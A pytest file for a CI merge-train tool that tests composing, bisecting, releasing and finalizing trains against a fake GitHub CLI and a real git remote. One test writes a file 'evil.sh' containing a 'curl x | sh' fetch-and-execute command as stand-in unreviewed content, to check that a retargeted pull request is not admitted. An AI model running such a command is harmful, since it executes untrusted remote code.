"""One ci-merge-train pass end to end: a fake GitHub (gh) over a REAL bare git remote.

compose -> the train branch is really pushed and verifies; red -> bisect ejects the newer half;
stale -> released and recomposed; merged -> each rider closed as landed at its rebased commit;
one candidate -> no train.
"""
from __future__ import annotations

import datetime as dt
import json
import subprocess
from pathlib import Path

import pytest
from _trainrepo import ENV, Repo, edit, git

from ci_kit import pr_autoupdate
from ci_kit.merge_train import EJECTED, LANDED, NEEDS_UPDATE, RIDING, TRAIN_LABEL, cli, github
from ci_kit.merge_train import git as tgit

REC = Path(__file__).parent / "fixtures" / "github"

REQ = ("unit tests", "review gate")
NOW = dt.datetime.now(dt.UTC).strftime("%Y-%m-%dT%H:%M:%SZ")
GREEN = [{"__typename": "CheckRun", "name": n, "status": "COMPLETED", "conclusion": "SUCCESS"} for n in REQ]


class FakeGH:
    """Answers the gh calls a pass makes from `prs` (number -> state); records the writes."""

    def __init__(self, repo: Repo) -> None:
        self.repo = repo
        self.prs: dict[int, dict] = {}
        self.calls: list[tuple] = []
        self.merged: list[dict] = []
        self.reviewed_ok = True
        self.next_number = 100
        self.comments: dict[int, list[str]] = {}
        self.close_fail: set[int] = set()
        self.merge_fail = ""

    def add(self, n: int, head: str, **k) -> None:
        self.prs[n] = {"number": n, "title": f"feat: {n}", "body": f"body {n}", "headRefName": f"pr{n}",
                       "headRefOid": head, "isCrossRepository": False, "baseRefName": "main", "isDraft": False,
                       "mergeable": "MERGEABLE", "mergeStateStatus": "BEHIND", "state": "open",
                       "autoMergeRequest": {"enabledAt": f"2026-11-11T00:00:{n:02d}Z"}, "labels": set(),
                       "statusCheckRollup": GREEN, "createdAt": NOW, "url": f"u/{n}", "author": "dev",
                       "reviewed_at": "2026-11-11T00:00:00Z", "retargeted": "", **k}

    def _gql(self) -> str:
        nodes = [{**{k: v for k, v in p.items() if k not in ("labels", "statusCheckRollup", "state", "body", "author",
                                                              "reviewed_at", "retargeted", "root")},
                  "labels": {"nodes": [{"name": x} for x in sorted(p["labels"])]},
                  "commits": {"nodes": [{"commit": {"statusCheckRollup": {"contexts": {"nodes": p["statusCheckRollup"]}}}}]}}
                 for p in self.prs.values() if p["state"] == "open"]
        return json.dumps({"data": {"repository": {"pullRequests": {"nodes": nodes}}}})

    def __call__(self, *a: str, check: bool = True, input_text: str | None = None, env: dict | None = None):
        self.calls.append(a)
        res = self._answer(a, input_text)
        rc, out = res if isinstance(res, tuple) else (0, res)
        if check and rc:
            raise subprocess.CalledProcessError(rc, ["gh", *a], out, "fake gh error")
        return subprocess.CompletedProcess(["gh", *a], rc, out, "")

    def _answer(self, a: tuple, stdin: str | None):  # noqa: PLR0911, PLR0912
        if a[:2] == ("api", "graphql") and any("BASE_REF_CHANGED_EVENT" in x for x in a):
            # RECORDED GitHub answers (tests/fixtures/github), never a hand-written shape (round 3)
            when = self.prs[int(next(x for x in a if x.startswith("pr="))[3:])]["retargeted"]
            if when == "BLIND":
                return 1, ""
            got = json.loads((REC / f"timeline_{'home-host_199_retargeted' if when else 'trade-data_2990_never'}.json")
                             .read_text(encoding="utf-8"))
            for node in got["data"]["repository"]["pullRequest"]["timelineItems"]["nodes"]:
                node["createdAt"] = when
            return json.dumps(got)
        if a[:2] == ("api", "graphql"):
            return self._gql()
        if a[:2] == ("api", "user"):
            return json.dumps({"login": "me", "id": 1})
        if a[0] == "api" and "/actions/workflows/" in a[1]:
            head = a[1].split("head_sha=")[1].split("&")[0]
            n = next((p["number"] for p in self.prs.values() if p["headRefOid"] == head), 0)
            made = self.prs[n]["reviewed_at"] if n else "x"
            now_base = {"ref": "main", "sha": git(self.repo.origin, "rev-parse", "main")}  # CURRENT base, as live
            return json.dumps({"workflow_runs": [{"id": 1, "created_at": made, "head_sha": head, "event": "pull_request",
                                                  "status": "completed", "head_branch": f"pr{n}",
                                                  "conclusion": "success" if self.reviewed_ok else "failure",
                                                  "pull_requests": [{"number": n, "head": {"sha": head}, "base": now_base}]}]})
        if a[0] == "api" and "/actions/runs/" in a[1]:
            run = a[1].rsplit("/", 1)[1]
            return json.dumps({"id": int(run), "path": ".github/workflows/merge-train.yml",
                               "repository": {"full_name": "o/r"}, "created_at": "2000-01-01T00:00:00Z",
                               "updated_at": "2999-01-01T00:00:00Z"})
        if a[0] == "api" and "/issues/" in a[1] and a[1].endswith("comments?per_page=100"):
            return json.dumps(self.comments.get(int(a[1].split("/issues/")[1].split("/")[0]), []))
        if a[0] == "api" and "/commits?per_page=100" in a[1]:
            m = int(a[1].split("/pulls/")[1].split("/")[0])
            head = self.prs[m]["headRefOid"]
            root = git(self.repo.work, "merge-base", self.prs[m]["root"], head)
            shas = git(self.repo.work, "rev-list", "--reverse", f"{root}..{head}").split()
            return json.dumps([tgit.message(self.repo.work, s) for s in shas])
        if a[0] == "api" and "/pulls/" in a[1]:
            p = self.prs[int(a[1].rsplit("/", 1)[1])]
            return json.dumps({"state": p["state"], "title": p["title"], "body": p["body"], "draft": p["isDraft"],
                               "auto_merge": p["autoMergeRequest"], "labels": [{"name": x} for x in p["labels"]],
                               "user": {"login": p["author"]}, "created_at": p["createdAt"], "base": {"ref": "main"},
                               "head": {"sha": p["headRefOid"], "ref": p["headRefName"], "repo": {"full_name": "o/r"}}})
        if a[0] == "api" and "/labels/" in a[1]:
            return "{}"
        if a[:2] == ("pr", "list"):
            return json.dumps(self.merged)
        if a[:2] == ("pr", "edit"):
            p = self.prs[int(a[2])]
            (p["labels"].add if a[5] == "--add-label" else p["labels"].discard)(a[6])
            return ""
        if a[:2] == ("pr", "comment"):
            self.comments.setdefault(int(a[2]), []).append(stdin or "")
            return ""
        if a[:2] == ("pr", "merge"):
            return (1, self.merge_fail) if self.merge_fail else ""
        if a[:2] == ("pr", "close"):
            if int(a[2]) in self.close_fail:
                return 1, "close refused"
            p = self.prs[int(a[2])]
            p["state"] = "closed"
            if "--delete-branch" in a:
                git(self.repo.origin, "update-ref", "-d", f"refs/heads/{p['headRefName']}")
            return ""
        if a[:2] == ("pr", "create"):
            m = self.next_number
            self.next_number += 1
            branch = a[a.index("--head") + 1]
            head = git(self.repo.origin, "rev-parse", f"refs/heads/{branch}")
            git(self.repo.origin, "update-ref", f"refs/pull/{m}/head", head)
            self.add(m, head, headRefName=branch, title=a[a.index("--title") + 1], body=stdin or "",
                     labels={TRAIN_LABEL}, statusCheckRollup=[], createdAt=NOW, author="me",
                     root=git(self.repo.origin, "rev-parse", "main"))
            return f"https://github.com/o/r/pull/{m}\n"
        return ""  # label create

    def wrote(self, verb: str) -> list[tuple]:
        return [c for c in self.calls if c[:2] == ("pr", verb)]


@pytest.fixture
def world(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> tuple[Repo, FakeGH]:
    repo = Repo(tmp_path)
    fake = FakeGH(repo)
    monkeypatch.setattr(github, "gh", fake)
    monkeypatch.setattr(pr_autoupdate, "_gh", fake)
    monkeypatch.delenv(pr_autoupdate.READ_TOKEN, raising=False)
    monkeypatch.delenv("GITHUB_STEP_SUMMARY", raising=False)

    def workspace(_repo: str) -> Path:
        d = tmp_path / f"ws{len(list(tmp_path.glob('ws*')))}"
        git(tmp_path, "clone", "-q", "--bare", str(repo.origin), str(d))
        git(d, "config", "remote.origin.fetch", "+refs/heads/*:refs/remotes/origin/*")
        return d
    monkeypatch.setattr(cli, "workspace", workspace)
    return repo, fake


_RUNS = iter(range(77, 10_000))


def _opts(**k) -> cli.Opts:
    """Each pass is its own workflow run: its own `train/<run>` branch."""
    return cli.Opts(repo="o/r", required=REQ, run_id=str(next(_RUNS)), **k)


def _riders(repo: Repo, fake: FakeGH, n: int) -> None:
    for i in range(1, n + 1):
        fake.add(i, repo.pr(i, {f"f{i}.txt": f"{i}\n"}))


def test_compose_opens_one_verified_train(world: tuple[Repo, FakeGH]) -> None:
    repo, fake = world
    _riders(repo, fake, 3)
    fake.add(4, repo.pr(4, {"a.txt": edit(1, "x")}), statusCheckRollup=GREEN[:1])   # review pending: not a candidate
    p = cli.Pass()
    assert cli.run(_opts(), p) == 0, p.summary
    train = fake.prs[100]
    assert train["headRefName"].startswith("train/") and train["title"] == "merge train: #1 #2 #3"
    assert [p["labels"] for n, p in fake.prs.items() if n <= 3] == [{RIDING}] * 3 and RIDING not in fake.prs[4]["labels"]
    assert not fake.wrote("merge")                                       # NOT armed: the pass lands it itself
    assert f"<!-- merge-train:composed run={train['headRefName'][6:]} branch={train['headRefName']} by=me -->" in train["body"]
    # the pushed branch is a train the review gate passes
    cons, problems = tgit.verify(repo.origin, repo.main, train["headRefOid"], lambda *a: None,
                                 lambda *a: (True, "", repo.main))
    assert problems == [] and [n for n, _, _ in cons] == [1, 2, 3]
    # the next pass sees it pending and does nothing else
    fake.calls.clear()
    assert cli.run(_opts(), cli.Pass()) == 0 and not fake.wrote("create") and not fake.wrote("close")


def test_one_candidate_is_left_to_auto_merge(world: tuple[Repo, FakeGH]) -> None:
    repo, fake = world
    _riders(repo, fake, 1)
    p = cli.Pass()
    assert cli.run(_opts(), p) == 0 and not fake.wrote("create")
    assert any("no train" in s for s in p.summary)


def test_an_unreviewed_head_does_not_ride(world: tuple[Repo, FakeGH]) -> None:
    repo, fake = world
    _riders(repo, fake, 3)
    fake.reviewed_ok = False
    p = cli.Pass()
    assert cli.run(_opts(), p) == 0 and not fake.wrote("create")
    assert sum("review gate concluded failure" in s for s in p.summary) == 3


def test_red_train_bisects_newer_half_out(world: tuple[Repo, FakeGH]) -> None:
    repo, fake = world
    _riders(repo, fake, 8)
    assert cli.run(_opts(), cli.Pass()) == 0
    fake.prs[100]["statusCheckRollup"] = [{**GREEN[0], "conclusion": "FAILURE"}, GREEN[1]]
    p = cli.Pass()
    assert cli.run(_opts(), p) == 0, p.summary
    assert fake.prs[100]["state"] == "closed"
    assert [n for n in range(1, 9) if EJECTED in fake.prs[n]["labels"]] == [5, 6, 7, 8]
    assert not any(RIDING in fake.prs[n]["labels"] for n in range(5, 9))
    # the same pass composes the older half (and nothing ejected)
    nxt = max(fake.prs)
    assert nxt == 101 and fake.prs[nxt]["title"] == "merge train: #1 #2 #3 #4"
    comments = [c for c in fake.calls if c[:2] == ("pr", "comment")]
    assert {int(c[2]) for c in comments} >= set(range(1, 9)) | {100}


def test_stale_train_is_released_and_recomposed(world: tuple[Repo, FakeGH]) -> None:
    repo, fake = world
    _riders(repo, fake, 2)
    assert cli.run(_opts(), cli.Pass()) == 0
    repo.advance_main({"c.txt": edit(3, "moved")})
    p = cli.Pass()
    assert cli.run(_opts(), p) == 0, p.summary
    assert fake.prs[100]["state"] == "closed" and fake.prs[101]["state"] == "open"
    assert not any(EJECTED in fake.prs[n]["labels"] for n in (1, 2))


def test_merged_train_closes_each_rider_as_landed(world: tuple[Repo, FakeGH]) -> None:
    repo, fake = world
    _riders(repo, fake, 3)
    assert cli.run(_opts(), cli.Pass()) == 0
    train = fake.prs[100]
    # GitHub rebase-merges it: new shas on main, same messages
    git(repo.work, "fetch", "-q", "origin", "refs/pull/100/head")
    git(repo.work, "checkout", "-q", "--detach", repo.main)
    git(repo.work, "cherry-pick", f"{repo.main}..{train['headRefOid']}",
        env={**ENV, "GIT_COMMITTER_NAME": "GitHub", "GIT_COMMITTER_DATE": "2030-01-01T00:00:00Z"})
    landed_tip = git(repo.work, "rev-parse", "HEAD")
    git(repo.work, "push", "-q", "origin", f"{landed_tip}:refs/heads/main")
    train["state"] = "merged"
    fake.merged = [{"number": 100, "mergeCommit": {"oid": landed_tip}, "labels": [{"name": TRAIN_LABEL}],
                    "mergedAt": "2099-01-01T00:00:00Z"}]
    # #3's author pushed after it rode: it stays open
    fake.prs[3]["headRefOid"] = repo.pr(3, {"later.txt": "later\n"}, base=fake.prs[3]["headRefOid"])
    p = cli.Pass()
    assert cli.run(_opts(), p) == 0, p.summary
    assert fake.prs[1]["state"] == fake.prs[2]["state"] == "closed"
    assert LANDED in fake.prs[1]["labels"] and RIDING not in fake.prs[1]["labels"]
    assert fake.prs[3]["state"] == "open" and RIDING not in fake.prs[3]["labels"]
    assert LANDED in fake.prs[100]["labels"]
    said = " ".join(s for s in p.summary)
    assert f"#2: landed as {git(repo.work, 'rev-parse', landed_tip + '~1')[:12]}" in said
    assert "#3: train #100 landed" in said and "left open" in said


def test_dry_run_writes_nothing(world: tuple[Repo, FakeGH]) -> None:
    repo, fake = world
    _riders(repo, fake, 3)
    p = cli.Pass()
    assert cli.run(_opts(dry_run=True), p) == 0
    assert not fake.wrote("create") and not fake.wrote("edit") and not fake.wrote("comment")
    assert any("(dry run) would open train/" in s for s in p.summary)


# ── ci-kit#70 session review: each fix, must fire ─────────────────────────────────────────────
def _green(fake: FakeGH, m: int = 100) -> None:
    fake.prs[m]["statusCheckRollup"] = GREEN


def test_a_green_train_lands_only_through_the_pass_after_every_rider_rechecks(world: tuple[Repo, FakeGH]) -> None:
    repo, fake = world
    _riders(repo, fake, 3)
    assert cli.run(_opts(), cli.Pass()) == 0
    _green(fake)
    p = cli.Pass()
    assert cli.run(_opts(), p) == 0, p.summary
    merges = fake.wrote("merge")
    assert len(merges) == 1 and merges[0][2] == "100" and "--rebase" in merges[0] and "--auto" not in merges[0]
    assert merges[0][merges[0].index("--match-head-commit") + 1] == fake.prs[100]["headRefOid"]


def test_a_rider_that_no_longer_wants_to_land_is_ejected_at_land_time_must_fire(world: tuple[Repo, FakeGH]) -> None:
    # finding 4: disarmed / opted out / draft / moved head / review gone between boarding and green
    repo, fake = world
    _riders(repo, fake, 5)
    assert cli.run(_opts(), cli.Pass()) == 0
    _green(fake)
    fake.prs[2]["autoMergeRequest"] = None
    fake.prs[3]["labels"].add("autoland-off")
    fake.prs[4]["isDraft"] = True
    fake.prs[5]["headRefOid"] = repo.pr(5, {"later.txt": "x\n"}, base=fake.prs[5]["headRefOid"])
    p = cli.Pass()
    assert cli.run(_opts(), p) == 0, p.summary
    assert not fake.wrote("merge") and fake.prs[100]["state"] == "closed"
    assert [n for n in range(1, 6) if EJECTED in fake.prs[n]["labels"]] == [2, 3, 4]
    said = " ".join(fake.comments[2] + fake.comments[3] + fake.comments[4])
    assert all(w in said for w in ("disarmed", "autoland-off", "draft"))
    assert EJECTED not in fake.prs[1]["labels"] and RIDING not in fake.prs[1]["labels"]
    # round 2, finding 4: a moved head is RELEASED (a new head re-admits it), never ejected
    assert RIDING not in fake.prs[5]["labels"] and "head moved" in fake.comments[5][-1]
    assert "why=moved" in fake.comments[5][-1]


def test_one_riders_unreadable_timeline_skips_that_rider_not_the_pass_must_fire(world: tuple[Repo, FakeGH]) -> None:
    # round 3, finding 4: GitHub will not answer #2's timeline -> #2 is BLIND and named; #1 #3 still ride
    repo, fake = world
    _riders(repo, fake, 3)
    fake.prs[2]["retargeted"] = "BLIND"
    p = cli.Pass()
    assert cli.run(_opts(), p) == 1, p.summary
    assert fake.prs[100]["title"] == "merge train: #1 #3" and RIDING not in fake.prs[2]["labels"]
    assert any(s.startswith("ERROR: #2: not riding, BLIND") for s in p.summary)


def test_a_rider_blind_at_land_time_is_released_not_ejected_and_nothing_lands_must_fire(world: tuple[Repo, FakeGH]) -> None:
    repo, fake = world
    _riders(repo, fake, 2)
    assert cli.run(_opts(), cli.Pass()) == 0
    _green(fake)
    fake.prs[2]["retargeted"] = "BLIND"
    p = cli.Pass()
    assert cli.run(_opts(), p) == 1, p.summary
    assert not fake.wrote("merge") and fake.prs[100]["state"] == "closed"
    assert EJECTED not in fake.prs[2]["labels"] and RIDING not in fake.prs[2]["labels"]
    assert "why=blind" in fake.comments[2][-1] and "BLIND" in fake.comments[2][-1]
    assert EJECTED not in fake.prs[1]["labels"]


def test_a_rider_skipped_for_moved_context_is_labelled_for_its_own_update_must_fire(world: tuple[Repo, FakeGH]) -> None:
    # round 2, finding 3: pr-autoupdate holds updates while a train is open; the label exempts it
    repo, fake = world
    fake.add(1, repo.pr(1, {"a.txt": edit(5, "r1 line5")}))
    fake.add(2, repo.pr(2, {"a.txt": edit(8, "r2 line8")}))       # line 5 is in its context
    fake.add(3, repo.pr(3, {"b.txt": edit(1, "r3")}))
    assert cli.run(_opts(), cli.Pass()) == 0
    assert fake.prs[100]["title"] == "merge train: #1 #3"
    assert NEEDS_UPDATE in fake.prs[2]["labels"] and RIDING not in fake.prs[2]["labels"]
    assert NEEDS_UPDATE not in fake.prs[1]["labels"]


def test_a_rider_whose_review_stopped_passing_is_ejected_at_land_time(world: tuple[Repo, FakeGH]) -> None:
    repo, fake = world
    _riders(repo, fake, 2)
    assert cli.run(_opts(), cli.Pass()) == 0
    _green(fake)
    fake.reviewed_ok = False
    p = cli.Pass()
    cli.run(_opts(), p)
    assert not fake.wrote("merge") and {EJECTED} <= fake.prs[1]["labels"] and {EJECTED} <= fake.prs[2]["labels"]


def test_a_green_train_github_will_not_merge_is_a_loud_failure_must_fire(world: tuple[Repo, FakeGH]) -> None:
    repo, fake = world
    _riders(repo, fake, 2)
    assert cli.run(_opts(), cli.Pass()) == 0
    _green(fake)
    fake.merge_fail = "Repository rule violations found"
    p = cli.Pass()
    assert cli.run(_opts(), p) == 1
    assert any("GitHub refused to merge it" in s and "rule violations" in s for s in p.summary)


def test_a_train_pr_this_workflow_did_not_compose_is_never_touched_must_fire(world: tuple[Repo, FakeGH]) -> None:
    # findings 1 + 8: a hand-made `train/` PR, green, with commits that might even verify
    repo, fake = world
    fake.add(50, repo.pr(50, {"a.txt": edit(2, "x")}), headRefName="train/123", author="someone",
             labels={TRAIN_LABEL}, autoMergeRequest=None)
    fake.add(51, repo.pr(51, {"b.txt": edit(2, "x")}), headRefName="train/124", author="me", labels={TRAIN_LABEL},
             autoMergeRequest=None, body="<!-- merge-train:composed run=999 branch=train/999 by=me -->")
    p = cli.Pass()
    assert cli.run(_opts(), p) == 1
    assert not fake.wrote("merge") and not fake.wrote("close")
    assert fake.prs[50]["state"] == fake.prs[51]["state"] == "open"
    errs = [s for s in p.summary if s.startswith("ERROR")]
    assert len(errs) == 2 and "#50" in errs[0] and "no composition record" in errs[0]
    assert "#51" in errs[1] and "not the record's train branch" in errs[1]


def test_a_composed_train_the_token_user_did_not_open_is_never_landed(world: tuple[Repo, FakeGH]) -> None:
    repo, fake = world
    _riders(repo, fake, 2)
    assert cli.run(_opts(), cli.Pass()) == 0
    _green(fake)
    fake.prs[100]["author"] = "someone"        # the record says `me` too: the record check names it
    fake.prs[100]["body"] = fake.prs[100]["body"].replace("by=me", "by=someone")
    p = cli.Pass()
    assert cli.run(_opts(), p) == 1 and not fake.wrote("merge")
    assert any("not this workflow's token user me" in s for s in p.summary)


def test_a_red_without_evidence_retries_and_never_ejects_must_fire(world: tuple[Repo, FakeGH]) -> None:
    # finding 6: a check that never started, or a BLIND gate, says nothing about any PR
    repo, fake = world
    _riders(repo, fake, 4)
    assert cli.run(_opts(), cli.Pass()) == 0
    fake.prs[100]["statusCheckRollup"] = [{**GREEN[0], "conclusion": "STARTUP_FAILURE"}, GREEN[1]]
    p = cli.Pass()
    assert cli.run(_opts(), p) == 1                     # loud
    assert fake.prs[100]["state"] == "closed" and not any(EJECTED in fake.prs[n]["labels"] for n in range(1, 5))
    assert fake.prs[101]["title"] == "merge train: #1 #2 #3 #4"          # all four recomposed
    # the review gate BLIND on the train: same
    fake.prs[101]["statusCheckRollup"] = [GREEN[0], {**GREEN[1], "conclusion": "FAILURE"}]
    fake.comments[101] = ["<!-- review-gate -->\n### review gate (merge train)\n\n**BLIND** -- could not verify"]
    assert cli.run(_opts(), cli.Pass()) == 1
    assert not any(EJECTED in fake.prs[n]["labels"] for n in range(1, 5))
    # twice at one head: HELD (not ejected, not labelled), and the run is red
    p = cli.Pass()
    assert cli.run(_opts(), p) == 1 and max(fake.prs) == 101
    assert sum("held out of trains" in s for s in p.summary) == 4
    assert not any(EJECTED in fake.prs[n]["labels"] for n in range(1, 5))


def test_a_gate_block_with_another_check_red_still_bisects(world: tuple[Repo, FakeGH]) -> None:
    repo, fake = world
    _riders(repo, fake, 2)
    assert cli.run(_opts(), cli.Pass()) == 0
    fake.prs[100]["statusCheckRollup"] = [{**g, "conclusion": "FAILURE"} for g in GREEN]
    fake.comments[100] = ["<!-- review-gate -->\n**BLOCKED: not a verified merge train.**"]
    cli.run(_opts(), cli.Pass())
    assert all(EJECTED in fake.prs[n]["labels"] for n in (1, 2))


def test_stale_trains_never_count_against_a_rider_must_fire(world: tuple[Repo, FakeGH]) -> None:
    # round 2, finding 2: stale only says main moved; it must never eject or hold anyone
    repo, fake = world
    _riders(repo, fake, 2)
    assert cli.run(_opts(), cli.Pass()) == 0
    for i in (1, 2, 3):
        repo.advance_main({"c.txt": edit(3 + i, f"moved {i}")})
        p = cli.Pass()
        assert cli.run(_opts(), p) == 0, p.summary
    assert max(fake.prs) == 103 and fake.prs[103]["state"] == "open" and fake.prs[103]["title"] == "merge train: #1 #2"
    assert not any({EJECTED} & fake.prs[n]["labels"] for n in (1, 2))
    assert all(sum("why=stale" in c for c in fake.comments[n]) == 3 for n in (1, 2))


def test_a_rider_released_from_two_stuck_trains_is_held_not_ejected_must_fire(world: tuple[Repo, FakeGH]) -> None:
    # finding 3, round 2: no infinite recompose on stuck -- HOLD until the head changes, never eject
    repo, fake = world
    _riders(repo, fake, 2)
    assert cli.run(_opts(), cli.Pass()) == 0
    old = (dt.datetime.now(dt.UTC) - dt.timedelta(hours=3)).strftime("%Y-%m-%dT%H:%M:%SZ")
    for m in (100, 101):
        fake.prs[m]["createdAt"] = old                                  # pending for 3h: stuck
        p = cli.Pass()
        assert cli.run(_opts(), p) == 1
    assert max(fake.prs) == 101 and fake.prs[101]["state"] == "closed"          # no third train
    assert not any({EJECTED} & fake.prs[n]["labels"] for n in (1, 2))
    assert sum("held out of trains" in s and "2 STUCK trains" in s for s in p.summary) == 2
    # a new head re-admits it
    fake.prs[1]["headRefOid"] = repo.pr(1, {"f1.txt": "1 again\n"})
    p = cli.Pass()
    cli.run(_opts(), p)
    assert not any(s.startswith("ERROR: #1:") for s in p.summary)


def test_finalize_retries_a_rider_whose_close_failed_must_fire(world: tuple[Repo, FakeGH]) -> None:
    # finding 9: a failed close leaves the train un-finalized, the rider unlabelled, and is retried
    repo, fake = world
    _riders(repo, fake, 2)
    assert cli.run(_opts(), cli.Pass()) == 0
    train = fake.prs[100]
    git(repo.work, "fetch", "-q", "origin", "refs/pull/100/head")
    git(repo.work, "checkout", "-q", "--detach", repo.main)
    git(repo.work, "cherry-pick", f"{repo.main}..{train['headRefOid']}", env={**ENV, "GIT_COMMITTER_NAME": "GitHub"})
    landed_tip = git(repo.work, "rev-parse", "HEAD")
    git(repo.work, "push", "-q", "origin", f"{landed_tip}:refs/heads/main")
    train["state"] = "merged"
    fake.merged = [{"number": 100, "mergeCommit": {"oid": landed_tip}, "labels": [{"name": TRAIN_LABEL}],
                    "mergedAt": "2099-01-01T00:00:00Z"}]
    fake.close_fail = {2}
    p = cli.Pass()
    assert cli.run(_opts(), p) == 1
    assert fake.prs[2]["state"] == "open" and LANDED not in fake.prs[2]["labels"]
    assert LANDED not in fake.prs[100]["labels"]
    fake.close_fail = set()
    fake.merged[0]["labels"] = [{"name": x} for x in fake.prs[100]["labels"]]
    assert cli.run(_opts(), cli.Pass()) == 0
    assert fake.prs[2]["state"] == "closed" and LANDED in fake.prs[2]["labels"] and LANDED in fake.prs[100]["labels"]
    assert sum("merge-train:landed" in c for c in fake.comments[2]) == 1          # told once


def test_finalize_says_whether_a_moved_head_moved_forward_or_was_rewritten(world: tuple[Repo, FakeGH]) -> None:
    repo, fake = world
    _riders(repo, fake, 3)
    assert cli.run(_opts(), cli.Pass()) == 0
    train = fake.prs[100]
    git(repo.work, "fetch", "-q", "origin", "refs/pull/100/head")
    git(repo.work, "checkout", "-q", "--detach", repo.main)
    git(repo.work, "cherry-pick", f"{repo.main}..{train['headRefOid']}", env={**ENV, "GIT_COMMITTER_NAME": "GitHub"})
    landed_tip = git(repo.work, "rev-parse", "HEAD")
    git(repo.work, "push", "-q", "origin", f"{landed_tip}:refs/heads/main")
    train["state"] = "merged"
    fake.merged = [{"number": 100, "mergeCommit": {"oid": landed_tip}, "labels": [{"name": TRAIN_LABEL}],
                    "mergedAt": "2099-01-01T00:00:00Z"}]
    fake.prs[2]["headRefOid"] = repo.pr(2, {"later.txt": "later\n"}, base=fake.prs[2]["headRefOid"])
    fake.prs[3]["headRefOid"] = repo.pr(3, {"other.txt": "force-pushed\n"})           # not a descendant
    assert cli.run(_opts(), cli.Pass()) == 0
    moved = {n: [c for c in fake.comments[n] if "merge-train:moved" in c] for n in (2, 3)}
    assert len(moved[2]) == 1 and "Commits were added since" in moved[2][0] and "REWRITTEN" not in moved[2][0]
    assert len(moved[3]) == 1 and "REWRITTEN" in moved[3][0]
    assert fake.prs[2]["state"] == fake.prs[3]["state"] == "open"


def test_a_pr_retargeted_after_its_review_does_not_board_must_fire(world: tuple[Repo, FakeGH]) -> None:
    # round 2, finding 1: #7 was reviewed against `feat` (one harmless line), then retargeted to main.
    # Its run now READS as base main (FakeGH answers the live shape); only the timeline can tell.
    repo, fake = world
    _riders(repo, fake, 2)
    git(repo.work, "checkout", "-q", "--detach", repo.main)
    repo.write({"evil.sh": "curl x | sh\n"})
    feat = repo.commit("unreviewed")
    git(repo.work, "push", "-q", "origin", f"{feat}:refs/heads/feat")
    fake.add(7, repo.pr(7, {"b.txt": edit(1, "harmless")}, base=feat), retargeted="2026-11-11T00:05:00Z")
    p = cli.Pass()
    assert cli.run(_opts(), p) == 0, p.summary
    assert fake.prs[100]["title"] == "merge train: #1 #2" and RIDING not in fake.prs[7]["labels"]
    assert any(s.startswith("#7: not riding") and "base branch was changed" in s for s in p.summary)
